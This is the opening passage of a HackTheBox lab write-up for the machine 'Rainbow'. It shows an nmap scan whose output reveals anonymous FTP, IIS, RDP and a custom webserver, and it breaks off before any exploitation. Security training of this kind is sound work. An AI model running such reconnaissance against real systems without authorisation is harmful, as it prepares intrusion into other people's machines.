<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://syanide-.github.io/writeups/writeups/HackTheBox/Machines/Rainbow/">
      
      
        <link rel="prev" href="../Breach/">
      
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
    
    
      
        <title>Rainbow - SYANiDE-.github.io writeups</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../css/app.css">
    
      <link rel="stylesheet" href="../../../../css/terminal-player.css">
    
      <link rel="stylesheet" href="../../../../css/asciinema-player.css">
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/panzoom.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style><meta name="panzoom-theme" content="material">
<meta name="panzoom-data" content='{"selectors": [".mermaid", ".d2"], "initial_zoom_level": 1.0}'> </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#static-analysis" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-header__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SYANiDE-.github.io writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Rainbow
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9z"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../.." class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../blog/" class="md-tabs__link">
          
  
  
    
  
  Blog

        </a>
      </li>
    
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../Breach/" class="md-tabs__link">
          
  
  
    
  
  Writeups

        </a>
      </li>
    
  

    
  

    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-nav__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    SYANiDE-.github.io writeups
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    About
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../../../blog/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
        
        
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    HackTheBox
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            HackTheBox
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Machines
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1_1">
            <span class="md-nav__icon md-icon"></span>
            Machines
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Breach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Breach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Rainbow
    
  </span>
  

      </a>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025172750.png" data-desc-position="bottom"><img alt="Pasted_image_20251025172750.png" src="../../../../Pasted_image_20251025172750.png"></a></p>
<p>Here we go again.</p>
<p>Start with an nmap scan.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.234.171
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-25<span class="w"> </span><span class="m">11</span>:40<span class="w"> </span>PDT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.234.171
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.14s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">993</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp<span class="w">           </span>Microsoft<span class="w"> </span>ftpd
<span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>SYST:<span class="w"> </span>Windows_NT
<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:22AM<span class="w">                  </span><span class="m">258</span><span class="w"> </span>dev.txt
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:30AM<span class="w">                </span><span class="m">54784</span><span class="w"> </span>rainbow.exe
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-16-22<span class="w">  </span><span class="m">01</span>:34PM<span class="w">                  </span><span class="m">479</span><span class="w"> </span>restart.ps1
<span class="p">|</span>_01-16-22<span class="w">  </span><span class="m">12</span>:14PM<span class="w">       </span>&lt;DIR&gt;<span class="w">          </span>wwwroot
<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
<span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
<span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
<span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>RAINBOW
<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>RAINBOW
<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>RAINBOW
<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>rainbow
<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>rainbow
<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.17763
<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-10-25T18:44:06+00:00
<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-25T18:44:45+00:00<span class="p">;</span><span class="w"> </span>+2s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>rainbow
<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-10-24T18:35:40
<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-04-25T18:35:40
<span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
<span class="p">|</span>_http-title:<span class="w"> </span>Dev<span class="w"> </span>Wiki<span class="w"> </span>powered<span class="w"> </span>by<span class="w"> </span>Rainbow<span class="w"> </span>Webserver
<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>GetRequest,<span class="w"> </span>HTTPOptions:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
<span class="p">|</span><span class="w">     </span>Cache-Control:<span class="w"> </span>no-cache,<span class="w"> </span>private
<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html
<span class="p">|</span><span class="w">     </span>X-Powered-By:<span class="w"> </span>Rainbow<span class="w"> </span><span class="m">0</span>.1
<span class="p">|</span><span class="w">     </span>Content-Length:<span class="w"> </span><span class="m">1478</span>
<span class="p">|</span><span class="w">     </span>&lt;!DOCTYPE<span class="w"> </span>html&gt;
<span class="p">|</span><span class="w">     </span>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;head&gt;
<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="w"> </span>/&gt;
<span class="p">|</span><span class="w">     </span>&lt;title&gt;Dev<span class="w"> </span>Wiki<span class="w"> </span>powered<span class="w"> </span>by<span class="w"> </span>Rainbow<span class="w"> </span>Webserver&lt;/title&gt;
<span class="p">|</span><span class="w">     </span>&lt;style&gt;<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>.rainbow<span class="w"> </span><span class="o">{</span>
<span class="p">|</span><span class="w">     </span>font-size:<span class="w"> </span>24pt<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>background-image:<span class="w"> </span>linear-gradient<span class="o">(</span>to<span class="w"> </span>left,<span class="w"> </span>violet,<span class="w"> </span>indigo,<span class="w"> </span>blue,<span class="w"> </span>green,<span class="w"> </span>yellow,<span class="w"> </span>orange,<span class="w"> </span>red<span class="o">)</span><span class="p">;</span><span class="w"> </span>-webkit-background-clip:<span class="w"> </span>text<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>color:<span class="w"> </span>transparent<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>body<span class="w"> </span><span class="o">{</span>
<span class="p">|</span><span class="w">     </span>display:<span class="w"> </span>flex<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>justify-content:<span class="w"> </span>center<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>align-items:<span class="w"> </span>center<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>text-align:<span class="w"> </span>center<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>min-height:<span class="w"> </span>100vh<span class="p">;</span>
<span class="p">|</span><span class="w">     </span>&lt;/style&gt;
<span class="p">|</span><span class="w">     </span>&lt;/head&gt;
<span class="p">|</span><span class="w">     </span>&lt;body&gt;
<span class="p">|</span><span class="w">     </span>&lt;!--<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>Under<span class="w"> </span>Development,<span class="w"> </span>please<span class="w"> </span>come<span class="w"> </span>back<span class="w"> </span>later<span class="w"> </span>--&gt;
<span class="p">|</span><span class="w">     </span>&lt;pre<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">"rainbow"</span>&gt;
<span class="p">|</span><span class="w">     </span>_.--<span class="s1">'_......----........</span>
<span class="s1">|     _,i,,-'' __,,...........___</span>
<span class="s1">|_    ,;-'</span><span class="w"> </span>_.--<span class="s1">''</span><span class="w"> </span>___,,...
<span class="p">|</span>_http-open-proxy:<span class="w"> </span>Proxy<span class="w"> </span>might<span class="w"> </span>be<span class="w"> </span>redirecting<span class="w"> </span>requests
<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
SF-Port8080-TCP:V<span class="o">=</span><span class="m">7</span>.95%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">10</span>/25%Time<span class="o">=</span>68FD19C3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
SF:etRequest,646,<span class="s2">"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20no-cache,\x2</span>
<span class="s2">SF:0private\r\nContent-Type:\x20text/html\r\nX-Powered-By:\x20Rainbow\x200</span>
<span class="s2">SF:\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html&gt;\n\</span>
<span class="s2">SF:n&lt;html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\"&gt;\n&lt;he</span>
<span class="s2">SF:ad&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"\x20/&gt;\n\x20\x20\x20\x20</span>
<span class="s2">SF:&lt;title&gt;Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webserver&lt;/title&gt;\n\x</span>
<span class="s2">SF:20\x20\x20\x20&lt;style&gt;\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20</span>
<span class="s2">SF:\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackground-image:\x20linea</span>
<span class="s2">SF:r-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,\x20green,\x20yel</span>
<span class="s2">SF:low,\x20orange,\x20red\);\x20\x20\x20-webkit-background-clip:\x20text;\</span>
<span class="s2">SF:n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x20\x20\t\tdisplay:</span>
<span class="s2">SF:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x20\t\t\x20align-i</span>
<span class="s2">SF:tems:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n\x20\x20\t\tmin-h</span>
<span class="s2">SF:eight:\x20100vh;\n\t}\n\x20\x20\x20\x20&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\x20\</span>
<span class="s2">SF:x20\x20\x20&lt;!--\x20\xf0\x9f\x8c\x88\x20Under\x20Development,\x20please\</span>
<span class="s2">SF:x20come\x20back\x20later\x20--&gt;\n\n\n\x20\x20\x20\x20\x20&lt;pre\x20class=</span>
<span class="s2">SF:\"rainbow\"&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span>
<span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.--'_\.\.\.\.\.\.-</span>
<span class="s2">SF:---\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span>
<span class="s2">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''\x20__,,\.\.\.\.\</span>
<span class="s2">SF:.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span>
<span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20\x20\x20\x20___,,</span>
<span class="s2">SF:\.\.\."</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,646,<span class="s2">"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x2</span>
<span class="s2">SF:0no-cache,\x20private\r\nContent-Type:\x20text/html\r\nX-Powered-By:\x2</span>
<span class="s2">SF:0Rainbow\x200\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf&lt;!DOCTYP</span>
<span class="s2">SF:E\x20html&gt;\n\n&lt;html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/</span>
<span class="s2">SF:xhtml\"&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"\x20/&gt;\n\x2</span>
<span class="s2">SF:0\x20\x20\x20&lt;title&gt;Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webserve</span>
<span class="s2">SF:r&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\x20\x20\x20\x20\n\x20\x20\x20\x20\x2</span>
<span class="s2">SF:0\x20\x20\x20\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackground-im</span>
<span class="s2">SF:age:\x20linear-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,\x20</span>
<span class="s2">SF:green,\x20yellow,\x20orange,\x20red\);\x20\x20\x20-webkit-background-cl</span>
